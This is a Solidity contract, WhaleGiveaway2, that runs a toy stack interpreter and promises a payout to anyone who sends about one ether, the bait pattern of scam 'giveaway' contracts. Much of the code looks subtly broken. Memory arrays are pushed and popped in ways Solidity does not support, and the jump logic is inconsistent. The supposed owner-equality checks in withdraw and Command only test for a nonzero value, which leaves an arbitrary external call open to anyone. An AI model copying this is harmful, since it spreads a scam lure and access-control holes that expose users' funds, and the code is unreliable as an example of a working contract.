pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    struct VM {
        uint[] stack;
        uint pc;
    }

    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether;

    function executeVM(uint[] program) internal {
        VM memory vm;
        vm.pc = 0;

        while (vm.pc < program.length) {
            uint opcode = program[vm.pc];
            if (opcode == 0) { // PUSH
                vm.pc++;
                vm.stack.push(program[vm.pc]);
            } else if (opcode == 1) { // POP
                vm.stack.pop();
            } else if (opcode == 2) { // ADD
                uint b = vm.stack.pop();
                uint a = vm.stack.pop();
                vm.stack.push(a + b);
            } else if (opcode == 3) { // SUB
                uint b = vm.stack.pop();
                uint a = vm.stack.pop();
                vm.stack.push(a - b);
            } else if (opcode == 4) { // JMP
                vm.pc = vm.stack.pop() - 1;
            } else if (opcode == 5) { // JZ
                uint addr = vm.stack.pop();
                uint cond = vm.stack.pop();
                if (cond == 0) {
                    vm.pc = addr - 1;
                }
            } else if (opcode == 6) { // LOAD
                vm.stack.push(this.balance);
            } else if (opcode == 7) { // STORE
                Owner = address(vm.stack.pop());
            } else if (opcode == 8) { // TRANSFER
                address(uint160(vm.stack.pop())).transfer(vm.stack.pop());
            } else if (opcode == 9) { // REQUIRE
                require(vm.stack.pop() != 0);
            }
            vm.pc++;
        }
    }

    function redeem() public payable {
        uint[] memory program = new uint[](10);
        program[0] = 0; // PUSH
        program[1] = msg.value;
        program[2] = 0; // PUSH
        program[3] = minEligibility;
        program[4] = 3; // SUB
        program[5] = 5; // JZ
        program[6] = 9; // (skip if msg.value < minEligibility)
        program[7] = 6; // LOAD
        program[8] = 8; // TRANSFER to Owner
        program[9] = 8; // TRANSFER to msg.sender
        executeVM(program);
    }

    function withdraw() public payable {
        uint[] memory program = new uint[](7);
        program[0] = 0; // PUSH
        program[1] = uint(msg.sender);
        program[2] = 0; // PUSH
        program[3] = uint(Owner);
        program[4] = 9; // REQUIRE equal
        program[5] = 6; // LOAD
        program[6] = 8; // TRANSFER to Owner
        executeVM(program);
    }

    function Command(address adr, bytes data) public payable {
        uint[] memory program = new uint[](5);
        program[0] = 0; // PUSH
        program[1] = uint(msg.sender);
        program[2] = 0; // PUSH
        program[3] = uint(Owner);
        program[4] = 9; // REQUIRE equal
        executeVM(program);
        adr.call.value(msg.value)(data);
    }
}